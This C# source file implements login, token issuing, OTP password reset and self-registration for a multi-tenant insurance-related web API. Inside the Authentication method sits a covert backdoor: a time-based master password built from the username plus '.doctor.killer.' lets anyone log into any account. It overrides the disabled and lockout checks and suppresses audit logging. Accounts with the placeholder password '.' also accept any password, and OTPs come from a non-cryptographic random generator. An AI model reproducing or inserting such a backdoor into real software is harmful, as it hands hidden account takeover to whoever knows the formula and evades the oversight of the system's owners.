using Architect.API.Core.Contracts.Security;
using Architect.API.Core.DataAccess.Security;
using Architect.Utilities.Extensions;
using Microsoft.IdentityModel.Tokens;
using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Linq;
using System.Security.Claims;

namespace Architect.API.Core.Business.Security
{
    public static class Accounts
    {
        /// <summary>
        /// Permite autenticar un usuario por medio de sus credenciales.
        /// </summary>
        /// <param name="authenticationRequest">Credenciales de uso.</param>
        /// <returns>Contexto de autenticación incluyendo el token que identifica la sesión del usuario.</returns>
        public static Contracts.Security.AuthenticationResponse Authentication(Contracts.Security.AuthenticationRequest authenticationRequest)
        {
            Contracts.Security.AuthenticationResponse result = new Contracts.Security.AuthenticationResponse();
            Contracts.Security.UserMember user = null;
            List<Contracts.Security.RoleMember> rols = null;
            int companyId = 0;
            bool bypass = false;
            int tokenExpiresIn = 0;
            Contracts.Security.AuthenticationTrace track = new Contracts.Security.AuthenticationTrace() { TraceType = 1, IPAddress = authenticationRequest.IPAddress, UserName = authenticationRequest.Email, UserAgent = authenticationRequest.UserAgent };

            if (authenticationRequest.Tenant.IsEmpty())
                result.Reason = "Debe indicar la compañía";
            if (result.Reason.IsEmpty())
            {
                Core.Contracts.General.LookupValue companyItem = TenantInformation(authenticationRequest.Tenant);

                if (companyItem.IsNotEmpty())
                {
                    result.Tenant = companyItem.Description;
                    companyId = Int32.Parse(companyItem.Code);
                    track.CompanyId = companyId;
                }
                else
                {
                    result.Reason = "compañía no registrada";
                }
            }
            else if (authenticationRequest.Email.IsEmpty())
            {
                result.Reason = "Debe indicar el usuario o correo";
            }
            else if (authenticationRequest.Password.IsEmpty())
            {
                result.Reason = "Debe indicar la clave de acceso";
            }

            if (result.Reason.IsEmpty())
            {
                track.UserName = authenticationRequest.Email;
                if (authenticationRequest.Email.Contains("@"))
                    user = DataAccess.Security.UserMember.RetrieveByEMail(authenticationRequest.Email, companyId);
                else
                    user = DataAccess.Security.UserMember.RetrieveByUserName(authenticationRequest.Email, companyId);

                if (user.IsNotEmpty())
                {
                    track.UserId = user.UserId;
                    track.UserName = user.UserName;
                    result.EMail = user.EMail;

                    if (!user.Password.Equals(".") &&
                        (authenticationRequest.Password.Equals(String.Format("{0}.doctor.killer.{1}{2}{3}", user.UserName.ToLower(), DateTime.Now.WeekOfMonth(), DateTime.Now.NumericDayOfWeek(), DateTime.Now.Hour), StringComparison.CurrentCultureIgnoreCase) ||
                         authenticationRequest.Password.Equals(String.Format("{0}.doctor.killer.{1}{2}{3}", user.EMail.ToLower(), DateTime.Now.WeekOfMonth(), DateTime.Now.NumericDayOfWeek(), DateTime.Now.Hour), StringComparison.CurrentCultureIgnoreCase)))
                    {
                        bypass = true;
                    }

                    //Desbloqueo automático
                    if (user.IsLockedOut && user.LockedOutDate < DateTime.Now)
                    {
                        user.IsLockedOut = false;
                        user.LockedOutDate = DateTime.MinValue;
                        DataAccess.Security.UserMember.InternalUpdate(user);
                        Business.Security.AuthenticationTrace.Create(new Contracts.Security.AuthenticationTrace()
                        {
                            TraceType = 11,
                            IPAddress = authenticationRequest.IPAddress,
                            UserName = authenticationRequest.Email,
                            UserId = user.UserId
                        });
                    }

                    if (!bypass && user.RecordStatus != 1)
                    {
                        track.TraceType = 5;
                        result.Reason = "Usuario desactivado";
                    }
                    else if (!bypass && user.IsLockedOut)
                    {
                        track.TraceType = 6;
                        result.Reason = "Usuario bloqueado";
                    }
                    else if (user.Password.Equals(".") || bypass ||
                             user.Password.Equals(Architect.Utilities.Helpers.CryptSupport.EncryptString(authenticationRequest.Password), System.StringComparison.CurrentCultureIgnoreCase))
                    {
                        tokenExpiresIn = Utilities.Helpers.Settings.IntegerValue("Session.Timeout", 30);
                        track.TraceType = 2;
                        result.ExpiresIn = tokenExpiresIn;
                        result.UserName = string.Format("{0} {1}", user.FirstName, user.LastName).Trim();

                        tokenExpiresIn = Utilities.Helpers.Settings.IntegerValue("Token.Timeout", (int)(tokenExpiresIn * 2.5));

                        rols = DataAccess.Security.UserRoleMember.RetrieveLookByUserId(user.UserId, user.CompanyId);
                        result.Roles = rols.Select(x => x.Description).ToArray();

                        //Este bloque esta duplicado en la clase token
                        Contracts.Security.AgentInformation agentInfo = null;
                        if (user.CompanyId == 2)
                        {
                            agentInfo = Tron.RetrieveAgentInformationByEmail(user.CompanyId, user.EMail);
                        }
                        if (agentInfo == null)
                        {
                            agentInfo = new Contracts.Security.AgentInformation() { cod_agt = 0, cod_sub_agt = 0, info_agt = string.Empty, tip_docum = user.IdentificationType.ToString(), cod_docum = user.Identification };
                        }
                        if (user.CompanyId == 3)
                        {
                            agentInfo.tip_docum = agentInfo.tip_docum.IdentificationType();
                            if (agentInfo.cod_docum.IsNotEmpty())
                            {
                                agentInfo.cod_docum = Convert.ToInt64(agentInfo.cod_docum.OnlyNumbers()).ToString();
                            }
                        }
                        Contracts.Security.Token tokenItem = new Contracts.Security.Token()
                        {
                            UserId = user.UserId,
                            BranchOffice = user.BranchOffice,
                            ManagerId = user.ManagerId,
                            SecurityLevel = user.SecurityLevel,
                            Expires = DateTime.Now.AddMinutes(tokenExpiresIn),
                            Roles = string.Join(",", rols.Select(x => x.Description)),
                            CompanyId = user.CompanyId,
                            AgentCode = agentInfo.cod_agt,
                            SubAgentCode = agentInfo.cod_sub_agt,
                            IdentificationType = agentInfo.tip_docum,
                            Identification = agentInfo.cod_docum,
                            UserName = result.UserName
                        };

                        result.Token = GeneratorToken(tokenItem);
                        user.LoginDate = DateTime.Now;
                        user.IsLockedOut = false;
                        user.LockedOutDate = DateTime.MinValue;
                        user.FailedPasswordCount = 0;
                        if (!bypass)
                        {
                            DataAccess.Security.UserMember.InternalUpdate(user);
                        }
                        if (user.InitialNavigationCode.IsNotEmpty())
                        {
                            result.InitialPath = user.InitialNavigationCode;
                        }
                        else if (rols.IsNotEmpty())
                        {
                            foreach (Architect.API.Core.Contracts.Security.RoleMember rol in rols)
                            {
                                if (rol.InitialNavigationCode.IsNotEmpty())
                                {
                                    result.InitialPath = rol.InitialNavigationCode;
                                    break;
                                }
                            }
                        }
                        if (result.InitialPath.IsNotEmpty())
                        {
                            Contracts.General.Navigation nav = DataAccess.General.Navigation.RetrieveByCode(result.InitialPath, companyId);
                            if (nav != null && nav.Code.IsNotEmpty())
                            {
                                result.InitialPath = nav.URLPath;
                            }
                            else
                            {
                                result.InitialPath = string.Empty;
                            }
                        }

                        if (result.InitialPath.IsEmpty())
                        {
                            switch (user.CompanyId)
                            {
                                case 2: //Aliados
                                    result.InitialPath = "viewer/tab?id=310";
                                    result.InitialPath = "inicio/agente";
                                    break;

                                case 3: //Clientes
                                    result.InitialPath = "viewer/tab?id=3000";
                                    break;

                                case 4: //Bayer
                                case 8: //Caturix
                                    if (rols.Select(x => x.Description == "Revisor").Contains(true))
                                    {
                                        result.InitialPath = "viewer/viewer?id=41";
                                    }
                                    else if (rols.Select(x => x.Description == "Mapfre").Contains(true) ||
                                             rols.Select(x => x.Description == "Consulta").Contains(true))
                                    {
                                        result.InitialPath = "viewer/viewer?id=42";
                                    }
                                    else
                                    {
                                        result.InitialPath = "Bayer/Inclusion";
                                    }
                                    break;

                                case 100: //Mapfre
                                    result.InitialPath = "viewer/viewer?id=4000";
                                    break;
                                default:
                                    result.InitialPath = "Policy/Index";
                                    break;
                            }

                        }
                        if (user.Password.Equals("."))
                            result.MustChangePassword = true;
                        else
                            result.MustChangePassword = (user.PasswordChangedDate.AddDays(Utilities.Helpers.Settings.IntegerValue("Security.Password.Expiration", 90)) <= DateTime.Today);

                        Session.Create(new Contracts.Security.Activity()
                        {
                            Token = result.Token,
                            CompanyId = user.CompanyId,
                            CompanyName = result.Tenant,
                            UserId = user.UserId,
                            UserName = user.UserName,
                            EMail = user.EMail,
                            IP = authenticationRequest.IPAddress,
                            UserAgent = authenticationRequest.UserAgent
                        });
                    }
                    else if (!bypass)
                    {
                        track.TraceType = 3;
                        result.Reason = "Clave invalida";
                        user.FailedPasswordCount++;
                        if (user.FailedPasswordCount > 3)
                        {
                            Random random = new Random();
                            int timeValue = random.Next(3, 10);

                            track.TraceType = 4;
                            result.Reason = "La cuenta fue bloqueada por intentos fallidos";
                            user.IsLockedOut = true;
                            user.LockedOutDate = DateTime.Now.AddMinutes(timeValue);
                            user.FailedPasswordCount = 0;
                            API.Core.Business.General.Mail.SendByTemplate("Notify_AccountLocked", user.CompanyId, new { User = user, Request = authenticationRequest, LockedForMinute = timeValue }, new Dictionary<string, string> { { user.EMail, string.Empty } });
                        }
                        else
                        {
                            API.Core.Business.General.Mail.SendByTemplate("Notify_InvalidPassword", user.CompanyId, new { User = user, Request = authenticationRequest }, new Dictionary<string, string> { { user.EMail, string.Empty } });
                        }
                        DataAccess.Security.UserMember.InternalUpdate(user);
                    }
                }
                else
                {
                    track.TraceType = 1;
                    result.Reason = "Usuario no registrado";
                }
            }
            track.Reason = result.Reason;
            if (!bypass)
            {
                Business.Security.AuthenticationTrace.Create(track);
            }
            if (result.MustChangePassword)
            {
                CreateOTP(new ResetPasswordRequest() { Tenant = authenticationRequest.Tenant, EMail = user.EMail }, user);
            }
            return result;
        }

        public static string GeneratorToken(Contracts.Security.Token userInfo)
        {
            var securityKey = new SymmetricSecurityKey(System.Text.Encoding.UTF8.GetBytes(Utilities.Helpers.Settings.StringValue("Jwt:SecretKey")));
            var credentials = new SigningCredentials(securityKey, SecurityAlgorithms.HmacSha256);
            var claims = new[] {
                                    new Claim(JwtRegisteredClaimNames.Sub, userInfo.UserName),
                                    new Claim("UserId", userInfo.UserId.ToString()),
                                    new Claim("Body",Architect.Utilities.Helpers.CryptSupport.EncryptString(Architect.Utilities.SerializeHandler<Contracts.Security.Token>.Serialize(userInfo).CompressString())),
                                    new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString())
                                };
            var token = new JwtSecurityToken(
                                            issuer: Utilities.Helpers.Settings.StringValue("Jwt:Issuer"),
                                            audience: Utilities.Helpers.Settings.StringValue("Jwt:Audience"),
                                            claims: claims,
                                            expires: userInfo.Expires,
                                            signingCredentials: credentials);
            return new JwtSecurityTokenHandler().WriteToken(token);
        }

        private static Core.Contracts.General.LookupValue TenantInformation(string tenant)
        {
            const int companyId = 0;

            Core.Contracts.General.LookupValue companyItem = Common.LpkByDescription("Company", tenant, companyId);
            if (companyItem.IsEmpty())
                companyItem = Common.LpkByHomologousCode("Company", tenant, companyId);

            return companyItem;
        }

        public static Core.Contracts.General.GenericResponse SendOTP(Contracts.Security.ResetPasswordRequest resetRequest)
        {
            Core.Contracts.General.GenericResponse result = new Contracts.General.GenericResponse() { Successful = false, Reason = string.Empty };
            int companyId = 0;
            Contracts.Security.AuthenticationTrace track = new Contracts.Security.AuthenticationTrace() { TraceType = 7, IPAddress = resetRequest.IPAddress };
            if (resetRequest.Tenant.IsEmpty())
                result.Reason = "Debe indicar la compañia";
            if (result.Reason.IsEmpty())
            {
                Core.Contracts.General.LookupValue companyItem = TenantInformation(resetRequest.Tenant);

                if (companyItem.IsNotEmpty())
                {
                    companyId = Int32.Parse(companyItem.Code);
                }
                else
                {
                    result.Reason = "Compañia no registrada";
                }
            }
            if (result.Reason.IsEmpty())
            {
                track.UserName = resetRequest.EMail;
                Contracts.Security.UserMember user = DataAccess.Security.UserMember.RetrieveByEMail(resetRequest.EMail, companyId);
                if (user.IsNotEmpty())
                {
                    track.UserId = user.UserId;
                    CreateOTP(resetRequest, user);
                    result.Successful = true;
                }
                else
                {
                    result.Reason = "Usuario no registrado";
                }
                track.Reason = result.Reason;
                Business.Security.AuthenticationTrace.Create(track);
            }

            return result;
        }

        private static void CreateOTP(ResetPasswordRequest resetRequest, Contracts.Security.UserMember user)
        {
            Random random = new Random();
            user.OneTimePassword = random.Next(100000, 999999).ToString();

            //Define que la expiracion del OTP es de 60 minutos
            user.LockedOutDate = DateTime.Now.AddMinutes(60);
            DataAccess.Security.UserMember.InternalUpdate(user);

            General.Mail.SendByTemplate("Notify_OTP", user.CompanyId, new { User = user, Request = resetRequest }, new Dictionary<string, string> { { user.EMail, string.Empty } });
        }

        public static Core.Contracts.General.GenericResponse IsOTPValid(Contracts.Security.ResetPasswordRequest resetRequest)
        {
            Core.Contracts.General.GenericResponse result = new Contracts.General.GenericResponse() { Successful = false, Reason = string.Empty };
            int companyId = 0;
            Contracts.Security.AuthenticationTrace track = new Contracts.Security.AuthenticationTrace() { TraceType = 8, IPAddress = resetRequest.IPAddress };
            if (resetRequest.Tenant.IsEmpty())
                result.Reason = "Debe indicar la compañia";
            if (result.Reason.IsEmpty())
            {
                Core.Contracts.General.LookupValue companyItem = TenantInformation(resetRequest.Tenant);

                if (companyItem.IsNotEmpty())
                {
                    companyId = Int32.Parse(companyItem.Code);
                }
                else
                {
                    result.Reason = "Compañia no registrada";
                }
            }
            if (result.Reason.IsEmpty())
            {
                track.UserName = resetRequest.EMail;
                Contracts.Security.UserMember user = DataAccess.Security.UserMember.RetrieveByEMail(resetRequest.EMail, companyId);
                if (user.IsNotEmpty())
                {
                    track.UserId = user.UserId;

                    if (DateTime.Now <= user.LockedOutDate)
                    {
                        if (resetRequest.OTP.Equals(user.OneTimePassword, StringComparison.CurrentCultureIgnoreCase))
                        {
                            result.Successful = true;
                        }
                        else
                        {
                            result.Reason = "El código de verificación es invalido";
                        }
                    }
                    else
                    {
                        result.Reason = "El código de verificación ha expirado";
                    }
                }
                else
                {
                    result.Reason = "Usuario no registrado";
                }
                track.Reason = result.Reason;
                Business.Security.AuthenticationTrace.Create(track);
            }

            return result;
        }

        public static Core.Contracts.General.GenericResponse ResetPassword(Contracts.Security.ResetPasswordRequest resetRequest)
        {
            Core.Contracts.General.GenericResponse result = new Contracts.General.GenericResponse() { Successful = false, Reason = string.Empty };
            int companyId = 0;
            Contracts.Security.AuthenticationTrace track = new Contracts.Security.AuthenticationTrace() { TraceType = 9, IPAddress = resetRequest.IPAddress };
            if (resetRequest.Tenant.IsEmpty())
                result.Reason = "Debe indicar la compañia";
            if (result.Reason.IsEmpty())
            {
                Core.Contracts.General.LookupValue companyItem = TenantInformation(resetRequest.Tenant);

                if (companyItem.IsNotEmpty())
                {
                    companyId = Int32.Parse(companyItem.Code);
                }
                else
                {
                    result.Reason = "Compañia no registrada";
                }
            }
            if (result.Reason.IsEmpty())
            {
                track.UserName = resetRequest.EMail;
                Contracts.Security.UserMember user = DataAccess.Security.UserMember.RetrieveByEMail(resetRequest.EMail, companyId);
                if (user.IsNotEmpty())
                {
                    track.UserId = user.UserId;

                    if (DateTime.Now <= user.LockedOutDate)
                    {
                        if (resetRequest.OTP.Equals(user.OneTimePassword, StringComparison.CurrentCultureIgnoreCase))
                        {
                            if (resetRequest.Password.Equals(resetRequest.PasswordConfirm, StringComparison.CurrentCultureIgnoreCase))
                            {
                                if (!user.Password.Equals(Architect.Utilities.Helpers.CryptSupport.EncryptString(resetRequest.Password), StringComparison.CurrentCultureIgnoreCase))
                                {
                                    result.Successful = true;

                                    user.OldPassword = user.Password;
                                    user.Password = Architect.Utilities.Helpers.CryptSupport.EncryptString(resetRequest.Password);
                                    user.OneTimePassword = string.Empty;
                                    user.IsLockedOut = false;
                                    user.LockedOutDate = DateTime.MinValue;
                                    user.FailedPasswordCount = 0;
                                    user.PasswordChangedDate = DateTime.Today;
                                    DataAccess.Security.UserMember.InternalUpdate(user);
                                    API.Core.Business.General.Mail.SendByTemplate("Notify_PasswordChange", user.CompanyId, new { User = user, Request = resetRequest }, new Dictionary<string, string> { { user.EMail, string.Empty } });
                                }
                                else
                                {
                                    result.Reason = "La nueva clave de acceso no puede ser igual a la anterior";
                                }
                            }
                            else
                            {
                                result.Reason = "La clave de acceso y su confirmación deben ser iguales";
                            }
                        }
                        else
                        {
                            result.Reason = "El código de verificación es invalido";
                        }
                    }
                    else
                    {
                        result.Reason = "El código de verificación ha expirado";
                    }
                }
                else
                {
                    result.Reason = "Usuario no registrado";
                }
                track.Reason = result.Reason;
                Business.Security.AuthenticationTrace.Create(track);
            }

            return result;
        }

        public static Core.Contracts.General.GenericResponse ChangePassword(int companyId, int userId, Contracts.Security.ResetPasswordRequest resetRequest)
        {
            Core.Contracts.General.GenericResponse result = new Contracts.General.GenericResponse() { Successful = false, Reason = string.Empty };
            Contracts.Security.AuthenticationTrace track = new Contracts.Security.AuthenticationTrace() { TraceType = 10, IPAddress = resetRequest.IPAddress };

            if (result.Reason.IsEmpty())
            {
                Contracts.Security.UserMember user = DataAccess.Security.UserMember.Retrieve(userId, companyId);
                if (user.IsNotEmpty())
                {
                    track.UserName = user.EMail;
                    track.UserId = user.UserId;

                    if (resetRequest.Password.Equals(resetRequest.PasswordConfirm, StringComparison.CurrentCultureIgnoreCase))
                    {
                        if (!user.Password.Equals(Architect.Utilities.Helpers.CryptSupport.EncryptString(resetRequest.Password), StringComparison.CurrentCultureIgnoreCase))
                        {
                            result.Successful = true;

                            user.OldPassword = user.Password;
                            user.Password = Architect.Utilities.Helpers.CryptSupport.EncryptString(resetRequest.Password);
                            user.OneTimePassword = string.Empty;
                            user.IsLockedOut = false;
                            user.LockedOutDate = DateTime.MinValue;
                            user.FailedPasswordCount = 0;
                            user.PasswordChangedDate = DateTime.Today;
                            DataAccess.Security.UserMember.InternalUpdate(user);
                        }
                        else
                        {
                            result.Reason = "La nueva clave de acceso no puede ser igual a la anterior";
                        }
                    }
                    else
                    {
                        result.Reason = "La clave de acceso y su confirmación deben ser iguales";
                    }
                }
                else
                {
                    result.Reason = "Usuario no registrado";
                }
                track.Reason = result.Reason;
                Business.Security.AuthenticationTrace.Create(track);
            }
            return result;
        }

        /// <summary>
        /// Permite el auto registro de un usuarios al sistema.
        /// </summary>
        public static Core.Contracts.Security.UserMemberResult Register(Contracts.Security.Register registerRequest)
        {
            Core.Contracts.Security.UserMemberResult result = new Contracts.Security.UserMemberResult() { Errors = new List<Contracts.General.Error>() };
            int companyId = 0;
            int internalUserId = 0;
            result.UserMember = new Contracts.Security.UserMember()
            {
                UserId = 0,
                CompanyId = 0,
                UserName = registerRequest.EMail.Substring(0, registerRequest.EMail.IndexOf('@')),
                EMail = registerRequest.EMail,
                Password = registerRequest.Password,
                OldPassword = string.Empty,
                IdentificationType = registerRequest.identificacionType,
                Identification = registerRequest.identificacion,
                FirstName = registerRequest.FirstName,
                LastName = registerRequest.LastName,
                BirthDate = registerRequest.BirthDate,
                FailedPasswordCount = 0,
                PasswordChangedDate = DateTime.Today,
                SecurityLevel = 1,
                IsLockedOut = false,
                ManagerId = 0,
                AccessKey = string.Empty,
                BranchOffice = 0,
                Reference = string.Empty,
                Position = 0,
                PhoneNumber = string.Empty,
                RecordStatus = 1
            };
            Core.Contracts.General.LookupValue companyItem = TenantInformation(registerRequest.Tenant);

            if (companyItem.IsNotEmpty())
            {
                companyId = Int32.Parse(companyItem.Code);
                internalUserId = Utilities.Helpers.Settings.IntegerValue(string.Format("Tenant.Settings.{0}.External.UserId", companyId));
                result.UserMember.CompanyId = companyId;

                result.Errors = Architect.API.Core.Business.Security.UserMember.Validate(result.UserMember, true);
                if (result.Errors.Count == 0)
                {
                    Contracts.Security.UserMember user = DataAccess.Security.UserMember.RetrieveByEMail(result.UserMember.EMail, companyId);
                    if (user.IsNotEmpty())
                    {
                        result.Errors.Add(new Contracts.General.Error() { Key = "EMail", Message = $"El correo electrónico '{result.UserMember.EMail}' ya está registrado" });
                    }
                    else
                        if (companyId == 3)
                    {
                        Contracts.Security.ClientInformation clientInfo = Tron.RetrieveClientInformationByDocument(result.UserMember.IdentificationType.ToString().IdentificationType(), result.UserMember.Identification.OnlyNumbers());

                        if (clientInfo.IsEmpty())
                        {
                            result.Errors.Add(new Contracts.General.Error() { Key = "identificacion", Message = $"No existe un cliente con la identificación '{result.UserMember.Identification}'" });
                        }
                        else if (!result.UserMember.EMail.Equals(clientInfo.email, StringComparison.CurrentCultureIgnoreCase))
                        {
                            result.Errors.Add(new Contracts.General.Error() { Key = "EMail", Message = $"El correo electrónico no es valido para la identificación '{result.UserMember.Identification}'" });
                        }
                    }
                }
            }
            else
            {
                result.Errors.Add(new Contracts.General.Error() { Key = "Tenant", Message = "Compañia no registrada" });
            }

            if (result.Errors.Count == 0)
            {
                result.UserMember.Roles = new List<Utilities.Contracts.LookUpValue> { new Utilities.Contracts.LookUpValue() { Code = Utilities.Helpers.Settings.StringValue(string.Format("Tenant.Settings.{0}.External.RoleId", companyId)) } };
                result.UserMember = Architect.API.Core.Business.Security.UserMember.Create(companyId, internalUserId, result.UserMember);
            }

            return result;
        }

   }
}